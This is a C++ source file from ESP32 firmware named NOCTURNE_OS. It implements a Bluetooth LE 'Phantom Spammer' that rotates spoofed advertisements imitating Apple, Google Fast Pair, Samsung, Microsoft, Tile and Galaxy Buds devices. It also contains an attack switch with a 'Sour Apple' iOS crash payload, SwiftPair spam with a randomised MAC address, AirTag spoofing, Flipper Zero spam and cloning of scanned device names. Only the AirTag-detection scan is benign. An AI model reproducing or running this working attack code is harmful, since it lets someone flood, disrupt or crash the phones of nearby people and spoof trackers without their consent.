/*
 * NOCTURNE_OS — BLE Phantom Spammer: rotate Apple / Google / Samsung payloads.
 * Builds with or without NimBLE: if NimBLEDevice.h is not found, BLE is a
 * no-op.
 */
#include "BleManager.h"
#include <Arduino.h>
#include <WiFi.h>
#if __has_include("NimBLEDevice.h")
#include "NimBLEDevice.h"
#include <esp_bt.h>
#include <string>
#include <vector>

// Apple AirPods Pro Gen2 — manufacturer data: 0x004C (LE) + 27 bytes.
// Byte 5 = 0x14 (Pro Gen2); ref Evil Apple Juice / TappelPayloads.
static const uint8_t kPayloadApple[] = {
    0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30,
    0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const size_t kPayloadAppleLen = sizeof(kPayloadApple);

// Google Fast Pair — Service Data 0xFE2C, 3-byte Model ID (known to trigger).
static const uint8_t kPayloadFastPair[] = {0x0b, 0x0c, 0x09}; // Model ID
static const size_t kPayloadFastPairLen = sizeof(kPayloadFastPair);

// Samsung (SmartTag / Galaxy Buds style) — manufacturer 0x0075, extended.
static const uint8_t kPayloadSamsung[] = {0x75, 0x00, 0x01, 0x01, 0x02,
                                          0x03, 0x04, 0x05, 0x06, 0x07};
static const size_t kPayloadSamsungLen = sizeof(kPayloadSamsung);

// Windows (Surface / accessories) — manufacturer 0x0006.
static const uint8_t kPayloadWindows[] = {0x06, 0x00, 0x03, 0x00, 0x01, 0x02};
static const size_t kPayloadWindowsLen = sizeof(kPayloadWindows);

// Tile (tracker) — manufacturer 0x0A65, common trigger.
static const uint8_t kPayloadTile[] = {0x65, 0x0a, 0x01, 0x00,
                                       0x00, 0x00, 0x00, 0x00};
static const size_t kPayloadTileLen = sizeof(kPayloadTile);

// Galaxy Buds — Samsung 0x0075, type 0x07.
static const uint8_t kPayloadGalaxyBuds[] = {0x75, 0x00, 0x07, 0x01,
                                             0x02, 0x03, 0x04, 0x05};
static const size_t kPayloadGalaxyBudsLen = sizeof(kPayloadGalaxyBuds);

static BleManager *s_bleManager = nullptr;

class BleScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
  void onResult(NimBLEAdvertisedDevice *device) override {
    if (s_bleManager == nullptr)
      return;
    s_bleManager->onScanResult(device);
  }
};
static BleScanCallbacks *s_scanCb = nullptr;
#endif

BleManager::BleManager() {
#if __has_include("NimBLEDevice.h")
  memset(scanDevices_, 0, sizeof(scanDevices_));
  memset(airTags_, 0, sizeof(airTags_));
  cloneName_[0] = '\0';
  cloneAddr_[0] = '\0';
  airTagCount_ = 0;
  currentAttackType_ = BLE_ATTACK_SPAM;
#endif
}

void BleManager::setPayload(int index) {
#if __has_include("NimBLEDevice.h")
  if (!active_ || !NimBLEDevice::getInitialized()) {
    Serial.println("[PHANTOM] Cannot set payload - BLE not active");
    return;
  }

  // Валидация индекса
  if (index < 0 || index >= BLE_PHANTOM_PAYLOAD_COUNT) {
    Serial.printf("[PHANTOM] Invalid payload index %d, using 0\n", index);
    index = 0;
  }

  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  if (pAdvertising == nullptr) {
    Serial.println("[PHANTOM] ERROR: Advertising object is null");
    return;
  }

  // Остановка предыдущей рекламы
  pAdvertising->stop();
  yield(); // Allow BLE stack to process stop command

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);

  switch (index) {
  case 0: // Apple AirPods
  {
    std::vector<uint8_t> appleData(kPayloadApple,
                                   kPayloadApple + kPayloadAppleLen);
    advData.setManufacturerData(appleData);
  } break;
  case 1: // Google Fast Pair — Service Data UUID 0xFE2C, 3-byte Model ID
  {
    NimBLEUUID serviceUUID((uint16_t)0xFE2C);
    std::string fastPairData(kPayloadFastPair,
                             kPayloadFastPair + kPayloadFastPairLen);
    advData.setServiceData(serviceUUID, fastPairData);
  } break;
  case 2: // Samsung
  {
    std::vector<uint8_t> samsungData(kPayloadSamsung,
                                     kPayloadSamsung + kPayloadSamsungLen);
    advData.setManufacturerData(samsungData);
  } break;
  case 3: // Windows (Microsoft)
  {
    std::vector<uint8_t> windowsData(kPayloadWindows,
                                     kPayloadWindows + kPayloadWindowsLen);
    advData.setManufacturerData(windowsData);
  } break;
  case 4: // Tile
  {
    std::vector<uint8_t> tileData(kPayloadTile, kPayloadTile + kPayloadTileLen);
    advData.setManufacturerData(tileData);
  } break;
  case 5: // Galaxy Buds
  {
    std::vector<uint8_t> budsData(kPayloadGalaxyBuds,
                                  kPayloadGalaxyBuds + kPayloadGalaxyBudsLen);
    advData.setManufacturerData(budsData);
  } break;
  default: {
    std::vector<uint8_t> appleData(kPayloadApple,
                                   kPayloadApple + kPayloadAppleLen);
    advData.setManufacturerData(appleData);
  } break;
  }

  pAdvertising->setAdvertisementData(advData);

  // Запуск рекламы с проверкой ошибок
  if (!pAdvertising->start(0, nullptr)) {
    Serial.println("[PHANTOM] ERROR: Failed to start advertising");
    return;
  }

  packetCount_++;
  currentPayloadIndex_ = index;
#else
  (void)index;
#endif
}

void BleManager::startSpam() {
#if __has_include("NimBLEDevice.h")
  setPayload(0);
#endif
}

void BleManager::begin() {
  // Проверка состояния WiFi перед запуском BLE (вне условной компиляции)
  wifi_mode_t wifiMode = WiFi.getMode();
  if (wifiMode != WIFI_OFF) {
    Serial.println("[PHANTOM] WARNING: WiFi not off, attempting to disable...");
    WiFi.disconnect(true);
    yield(); // Allow WiFi stack to process disconnect
    WiFi.mode(WIFI_OFF);
    yield(); // Allow WiFi mode change to complete
    wifiMode = WiFi.getMode();
    if (wifiMode != WIFI_OFF) {
      Serial.println(
          "[PHANTOM] ERROR: Failed to disable WiFi, BLE may not work");
      return;
    }
  }

  delay(100);

#if __has_include("NimBLEDevice.h")
  if (active_) {
    Serial.println("[PHANTOM] BLE already active");
    return;
  }

  // Инициализация NimBLE
  if (!NimBLEDevice::getInitialized()) {
    NimBLEDevice::init("PHANTOM");
    yield(); // Allow BLE stack to initialize
  }

  if (!NimBLEDevice::getInitialized()) {
    Serial.println("[PHANTOM] ERROR: NimBLE initialization failed");
    active_ = false;
    return;
  }

#if defined(CONFIG_IDF_TARGET_ESP32S3) ||                                      \
    defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2)
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
#else
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
#endif

  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  if (pAdvertising == nullptr) {
    Serial.println("[PHANTOM] ERROR: Failed to get advertising object");
    active_ = false;
    return;
  }

  pAdvertising->setScanResponse(false);
  startSpam();
  active_ = true;
  lastRotateMs_ = millis();
  Serial.println("[PHANTOM] BLE spam ACTIVE (WiFi off).");
#else
  Serial.println("[PHANTOM] BLE not available (NimBLE not found).");
  active_ = false;
#endif
}

void BleManager::stop() {
#if __has_include("NimBLEDevice.h")
  if (!active_ && !scanning_)
    return;
  if (scanning_) {
    NimBLEScan *pScan = NimBLEDevice::getScan();
    if (pScan)
      pScan->stop();
    s_bleManager = nullptr;
    scanning_ = false;
  }
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  if (pAdvertising != nullptr) {
    pAdvertising->stop();
    yield();
  }
  if (NimBLEDevice::getInitialized()) {
    NimBLEDevice::deinit(true);
    yield();
  }
  active_ = false;
  cloning_ = false;
  packetCount_ = 0;
  currentPayloadIndex_ = 0;
  Serial.println("[PHANTOM] BLE STOPPED.");
#else
  active_ = false;
  scanning_ = false;
#endif
}

void BleManager::tick() {
#if __has_include("NimBLEDevice.h")
  if (!active_ || scanning_)
    return;

  if (!NimBLEDevice::getInitialized()) {
    active_ = false;
    return;
  }

  unsigned long now = millis();
  if (now - lastRotateMs_ >= BLE_PHANTOM_ROTATE_MS) {
    lastRotateMs_ = now;
    int next = (currentPayloadIndex_ + 1) % BLE_PHANTOM_PAYLOAD_COUNT;
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    if (pAdvertising != nullptr) {
      pAdvertising->stop();
      yield();
    }
    setPayload(next);
  }
#endif
}

#if __has_include("NimBLEDevice.h")
void BleManager::onScanResult(void *device) {
  NimBLEAdvertisedDevice *dev = (NimBLEAdvertisedDevice *)device;
  if (dev == nullptr)
    return;

  // AirTag monitoring
  if (airTagMonitoring_) {
#ifndef HAS_NIMBLE_2
    uint8_t *payLoad = dev->getPayload();
    size_t len = dev->getPayloadLength();
#else
    const std::vector<unsigned char> &payLoad = dev->getPayload();
    size_t len = payLoad.size();
#endif

    if (len >= 4) {
      bool isAirTag = false;
      for (size_t i = 0; i <= len - 4; i++) {
#ifndef HAS_NIMBLE_2
        if ((payLoad[i] == 0x1E && payLoad[i + 1] == 0xFF &&
             payLoad[i + 2] == 0x4C && payLoad[i + 3] == 0x00) ||
            (payLoad[i] == 0x4C && payLoad[i + 1] == 0x00 &&
             payLoad[i + 2] == 0x12 && payLoad[i + 3] == 0x19)) {
          isAirTag = true;
          break;
        }
#else
        if ((payLoad[i] == 0x1E && payLoad[i + 1] == 0xFF &&
             payLoad[i + 2] == 0x4C && payLoad[i + 3] == 0x00) ||
            (payLoad[i] == 0x4C && payLoad[i + 1] == 0x00 &&
             payLoad[i + 2] == 0x12 && payLoad[i + 3] == 0x19)) {
          isAirTag = true;
          break;
        }
#endif
      }

      if (isAirTag && airTagCount_ < BLE_SCAN_DEVICE_MAX) {
        std::string addr = dev->getAddress().toString();
        int rssi = dev->getRSSI();
        // Check if already in list
        for (int i = 0; i < airTagCount_; i++) {
          if (strcmp(airTags_[i].addr, addr.c_str()) == 0) {
            airTags_[i].rssi = rssi;
            return;
          }
        }
        // Add new AirTag
        int i = airTagCount_++;
        strncpy(airTags_[i].addr, addr.c_str(), BLE_DEVICE_ADDR_LEN - 1);
        airTags_[i].addr[BLE_DEVICE_ADDR_LEN - 1] = '\0';
        strncpy(airTags_[i].name, "AirTag", BLE_DEVICE_NAME_LEN - 1);
        airTags_[i].name[BLE_DEVICE_NAME_LEN - 1] = '\0';
        airTags_[i].rssi = rssi;
        Serial.printf("[BLE] AirTag detected: %s RSSI: %d\n", addr.c_str(),
                      rssi);
      }
    }
    return; // Don't process regular scan when monitoring AirTags
  }

  // Regular scan
  if (scanCount_ >= BLE_SCAN_DEVICE_MAX)
    return;
  std::string addr = dev->getAddress().toString();
  std::string name = dev->getName();
  int rssi = dev->getRSSI();
  for (int i = 0; i < scanCount_; i++) {
    if (strcmp(scanDevices_[i].addr, addr.c_str()) == 0) {
      scanDevices_[i].rssi = rssi;
      if (name.length() > 0)
        strncpy(scanDevices_[i].name, name.c_str(), BLE_DEVICE_NAME_LEN - 1);
      return;
    }
  }
  int i = scanCount_++;
  strncpy(scanDevices_[i].addr, addr.c_str(), BLE_DEVICE_ADDR_LEN - 1);
  scanDevices_[i].addr[BLE_DEVICE_ADDR_LEN - 1] = '\0';
  if (name.length() > 0)
    strncpy(scanDevices_[i].name, name.c_str(), BLE_DEVICE_NAME_LEN - 1);
  else
    strncpy(scanDevices_[i].name, "(unknown)", BLE_DEVICE_NAME_LEN - 1);
  scanDevices_[i].name[BLE_DEVICE_NAME_LEN - 1] = '\0';
  scanDevices_[i].rssi = rssi;
}
#endif

void BleManager::beginScan() {
#if __has_include("NimBLEDevice.h")
  if (WiFi.getMode() != WIFI_OFF) {
    WiFi.disconnect(true);
    yield();
    WiFi.mode(WIFI_OFF);
    delay(100);
  }
  if (scanning_ || active_) {
    if (active_ && !scanning_)
      stop();
  }
  s_bleManager = this;
  if (!NimBLEDevice::getInitialized())
    NimBLEDevice::init("SCAN");
  scanCount_ = 0;
  memset(scanDevices_, 0, sizeof(scanDevices_));
  NimBLEScan *pScan = NimBLEDevice::getScan();
  if (pScan) {
    if (s_scanCb == nullptr)
      s_scanCb = new BleScanCallbacks();
    pScan->setAdvertisedDeviceCallbacks(s_scanCb);
    pScan->setInterval(80);
    pScan->setWindow(50);
    pScan->setActiveScan(true);
    pScan->start(0, nullptr);
    scanning_ = true;
    active_ = true;
    Serial.println("[BLE] Scan ACTIVE.");
  }
#else
  scanning_ = false;
  active_ = false;
#endif
}

void BleManager::stopScan() {
#if __has_include("NimBLEDevice.h")
  if (!scanning_)
    return;
  NimBLEScan *pScan = NimBLEDevice::getScan();
  if (pScan)
    pScan->stop();
  if (NimBLEDevice::getInitialized())
    NimBLEDevice::deinit(true);
  s_bleManager = nullptr;
  scanning_ = false;
  active_ = false;
  Serial.println("[BLE] Scan STOP.");
#endif
}

const BleScanDevice *BleManager::getScanDevice(int index) const {
  if (index < 0 || index >= scanCount_)
    return nullptr;
  return &scanDevices_[index];
}

void BleManager::cloneDevice(int index) {
#if __has_include("NimBLEDevice.h")
  if (index < 0 || index >= scanCount_)
    return;
  stopScan();
  strncpy(cloneName_, scanDevices_[index].name, BLE_DEVICE_NAME_LEN - 1);
  cloneName_[BLE_DEVICE_NAME_LEN - 1] = '\0';
  strncpy(cloneAddr_, scanDevices_[index].addr, BLE_DEVICE_ADDR_LEN - 1);
  cloneAddr_[BLE_DEVICE_ADDR_LEN - 1] = '\0';
  cloning_ = true;
  NimBLEDevice::init(cloneName_);
  NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
  if (pAdv) {
    NimBLEAdvertisementData adv;
    adv.setName(cloneName_);
    pAdv->setAdvertisementData(adv);
    pAdv->start(0, nullptr);
  }
  active_ = true;
  Serial.printf("[BLE] Clone: %s\n", cloneName_);
#endif
}

void BleManager::generateRandomMac(uint8_t *mac) {
  if (!mac)
    return;
  for (int i = 0; i < 6; i++) {
    mac[i] = (uint8_t)random(256);
  }
  // Set locally administered bit (bit 1 of first octet)
  mac[0] = (mac[0] & 0xFE) | 0x02;
}

void BleManager::setBaseMacAddress(uint8_t *mac) {
#if __has_include("NimBLEDevice.h")
  if (!mac)
    return;
  esp_err_t err = esp_base_mac_addr_set(mac);
  if (err != ESP_OK) {
    Serial.printf("[BLE] Failed to set MAC: %d\n", (int)err);
  }
#endif
}

void BleManager::setAttackPayload(BleAttackType attackType) {
#if __has_include("NimBLEDevice.h")
  if (!active_ || !NimBLEDevice::getInitialized()) {
    Serial.println("[BLE] Cannot set attack payload - BLE not active");
    return;
  }

  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  if (pAdvertising == nullptr) {
    Serial.println("[BLE] ERROR: Advertising object is null");
    return;
  }

  pAdvertising->stop();
  yield();

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);

  switch (attackType) {
  case BLE_ATTACK_SOUR_APPLE: {
    // Sour Apple: iOS crash payload (CVE-2023-23529)
    // Apple Actions payload with specific action types
    uint8_t sourApplePayload[11];
    sourApplePayload[0] = 0x0A; // Length
    sourApplePayload[1] = 0xFF; // Manufacturer Specific
    sourApplePayload[2] = 0x4C; // Apple Company ID (LSB)
    sourApplePayload[3] = 0x00; // Apple Company ID (MSB)
    sourApplePayload[4] = 0x0F; // Type
    sourApplePayload[5] = 0x05; // Length
    sourApplePayload[6] = 0xC0; // Action Flags
    // Action types that trigger crash
    const uint8_t crashTypes[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f};
    sourApplePayload[7] = crashTypes[random(sizeof(crashTypes))];
    sourApplePayload[8] = (uint8_t)random(256);
    sourApplePayload[9] = (uint8_t)random(256);
    sourApplePayload[10] = (uint8_t)random(256);
    std::vector<uint8_t> payloadVec(sourApplePayload, sourApplePayload + 11);
    advData.setManufacturerData(payloadVec);
    Serial.println("[BLE] Sour Apple payload set");
  } break;

  case BLE_ATTACK_SWIFTPAIR_MICROSOFT: {
    // Microsoft SwiftPair / Fast Pair
    uint8_t mac[6];
    generateRandomMac(mac);
    setBaseMacAddress(mac);

    // Generate random name
    char name[6];
    for (int i = 0; i < 5; i++) {
      name[i] = 'A' + random(26);
    }
    name[5] = '\0';

    uint8_t nameLen = strlen(name);
    uint8_t swiftPairPayload[7 + nameLen];
    int idx = 0;
    swiftPairPayload[idx++] = 7 + nameLen - 1;
    swiftPairPayload[idx++] = 0xFF;
    swiftPairPayload[idx++] = 0x06;
    swiftPairPayload[idx++] = 0x00;
    swiftPairPayload[idx++] = 0x03;
    swiftPairPayload[idx++] = 0x00;
    swiftPairPayload[idx++] = 0x80;
    memcpy(&swiftPairPayload[idx], name, nameLen);

    std::vector<uint8_t> payloadVec(swiftPairPayload,
                                    swiftPairPayload + 7 + nameLen);
    advData.setManufacturerData(payloadVec);
    Serial.println("[BLE] SwiftPair Microsoft payload set");
  } break;

  case BLE_ATTACK_SWIFTPAIR_GOOGLE: {
    // Google Fast Pair
    uint8_t googlePayload[14];
    int idx = 0;
    googlePayload[idx++] = 3;
    googlePayload[idx++] = 0x03;
    googlePayload[idx++] = 0x2C; // Fast Pair Service UUID LSB
    googlePayload[idx++] = 0xFE; // Fast Pair Service UUID MSB
    googlePayload[idx++] = 6;
    googlePayload[idx++] = 0x16;
    googlePayload[idx++] = 0x2C;
    googlePayload[idx++] = 0xFE;
    googlePayload[idx++] = 0x00; // Model ID
    googlePayload[idx++] = 0xB7;
    googlePayload[idx++] = 0x27;
    googlePayload[idx++] = 2;
    googlePayload[idx++] = 0x0A;
    googlePayload[idx++] = (uint8_t)(random(120) - 100); // TX Power

    // Add as service data
    NimBLEUUID serviceUUID((uint16_t)0xFE2C);
    std::string serviceData((char *)googlePayload + 4, 10);
    advData.setServiceData(serviceUUID, serviceData);
    advData.setTxPower((int8_t)googlePayload[13]);
    Serial.println("[BLE] SwiftPair Google payload set");
  } break;

  case BLE_ATTACK_SWIFTPAIR_SAMSUNG: {
    // Samsung spam
    uint8_t samsungPayload[15];
    int idx = 0;
    samsungPayload[idx++] = 14;
    samsungPayload[idx++] = 0xFF;
    samsungPayload[idx++] = 0x75; // Samsung Company ID (LSB)
    samsungPayload[idx++] = 0x00; // Samsung Company ID (MSB)
    samsungPayload[idx++] = 0x01;
    samsungPayload[idx++] = 0x00;
    samsungPayload[idx++] = 0x02;
    samsungPayload[idx++] = 0x00;
    samsungPayload[idx++] = 0x01;
    samsungPayload[idx++] = 0x01;
    samsungPayload[idx++] = 0xFF;
    samsungPayload[idx++] = 0x00;
    samsungPayload[idx++] = 0x00;
    samsungPayload[idx++] = 0x43;
    samsungPayload[idx++] = (uint8_t)random(256); // Watch model

    std::vector<uint8_t> payloadVec(samsungPayload, samsungPayload + 15);
    advData.setManufacturerData(payloadVec);
    Serial.println("[BLE] SwiftPair Samsung payload set");
  } break;

  case BLE_ATTACK_AIRTAG_SPOOF: {
    // AirTag spoofing payload
    uint8_t airtagPayload[27];
    airtagPayload[0] = 0x1E; // Length
    airtagPayload[1] = 0xFF;
    airtagPayload[2] = 0x4C; // Apple Company ID
    airtagPayload[3] = 0x00;
    airtagPayload[4] = 0x12; // AirTag type
    airtagPayload[5] = 0x19;
    // Generate random AirTag data
    for (int i = 6; i < 27; i++) {
      airtagPayload[i] = (uint8_t)random(256);
    }
    std::vector<uint8_t> payloadVec(airtagPayload, airtagPayload + 27);
    advData.setManufacturerData(payloadVec);
    Serial.println("[BLE] AirTag spoof payload set");
  } break;

  case BLE_ATTACK_FLIPPER_SPAM: {
    // Flipper Zero spam
    char name[6];
    for (int i = 0; i < 5; i++) {
      name[i] = 'A' + random(26);
    }
    name[5] = '\0';

    uint8_t flipperPayload[31];
    int idx = 0;
    flipperPayload[idx++] = 0x02;
    flipperPayload[idx++] = 0x01;
    flipperPayload[idx++] = 0x06;
    flipperPayload[idx++] = 0x06;
    flipperPayload[idx++] = 0x09;
    memcpy(&flipperPayload[idx], name, 5);
    idx += 5;
    flipperPayload[idx++] = 0x03;
    flipperPayload[idx++] = 0x02;
    flipperPayload[idx++] = 0x80 + random(3) + 1;
    flipperPayload[idx++] = 0x30;
    flipperPayload[idx++] = 0x02;
    flipperPayload[idx++] = 0x0A;
    flipperPayload[idx++] = 0x00;
    flipperPayload[idx++] = 0x05;
    flipperPayload[idx++] = 0xFF;
    flipperPayload[idx++] = 0xBA; // Flipper Zero Manufacturer ID (LSB)
    flipperPayload[idx++] = 0x0F; // Flipper Zero Manufacturer ID (MSB)
    for (int i = idx; i < 31; i++) {
      flipperPayload[i] = (uint8_t)random(256);
    }

    std::vector<uint8_t> payloadVec(flipperPayload, flipperPayload + 31);
    advData.setManufacturerData(payloadVec);
    advData.setName(name);
    Serial.println("[BLE] Flipper Zero spam payload set");
  } break;

  default:
    // Fallback to regular spam
    setPayload(currentPayloadIndex_);
    return;
  }

  pAdvertising->setAdvertisementData(advData);
  if (!pAdvertising->start(0, nullptr)) {
    Serial.println("[BLE] ERROR: Failed to start attack advertising");
    return;
  }

  packetCount_++;
  currentAttackType_ = attackType;
#endif
}

void BleManager::startAttack(BleAttackType attackType) {
#if __has_include("NimBLEDevice.h")
  if (WiFi.getMode() != WIFI_OFF) {
    Serial.println("[BLE] WARNING: WiFi not off, disabling...");
    WiFi.disconnect(true);
    yield();
    WiFi.mode(WIFI_OFF);
    delay(100);
  }

  if (active_ && attackType == currentAttackType_) {
    return; // Already running this attack
  }

  if (!NimBLEDevice::getInitialized()) {
    NimBLEDevice::init("ATTACK");
    yield();
  }

  if (!NimBLEDevice::getInitialized()) {
    Serial.println("[BLE] ERROR: NimBLE initialization failed");
    return;
  }

#if defined(CONFIG_IDF_TARGET_ESP32S3) ||                                      \
    defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2)
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
#else
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
#endif

  setAttackPayload(attackType);
  active_ = true;
  lastRotateMs_ = millis();
  Serial.printf("[BLE] Attack type %d ACTIVE\n", (int)attackType);
#endif
}

void BleManager::startAirTagMonitor() {
#if __has_include("NimBLEDevice.h")
  if (WiFi.getMode() != WIFI_OFF) {
    WiFi.disconnect(true);
    yield();
    WiFi.mode(WIFI_OFF);
    delay(100);
  }

  if (airTagMonitoring_)
    return;

  s_bleManager = this;
  if (!NimBLEDevice::getInitialized())
    NimBLEDevice::init("AIRTAG");
  airTagCount_ = 0;
  memset(airTags_, 0, sizeof(airTags_));
  NimBLEScan *pScan = NimBLEDevice::getScan();
  if (pScan) {
    if (s_scanCb == nullptr)
      s_scanCb = new BleScanCallbacks();
    pScan->setAdvertisedDeviceCallbacks(s_scanCb);
    pScan->setInterval(80);
    pScan->setWindow(50);
    pScan->setActiveScan(true);
    pScan->start(0, nullptr);
    airTagMonitoring_ = true;
    Serial.println("[BLE] AirTag monitoring ACTIVE");
  }
#endif
}

void BleManager::stopAirTagMonitor() {
#if __has_include("NimBLEDevice.h")
  if (!airTagMonitoring_)
    return;
  NimBLEScan *pScan = NimBLEDevice::getScan();
  if (pScan)
    pScan->stop();
  airTagMonitoring_ = false;
  Serial.println("[BLE] AirTag monitoring STOP");
#endif
}

const BleScanDevice *BleManager::getAirTag(int index) const {
  if (index < 0 || index >= airTagCount_)
    return nullptr;
  return &airTags_[index];
}
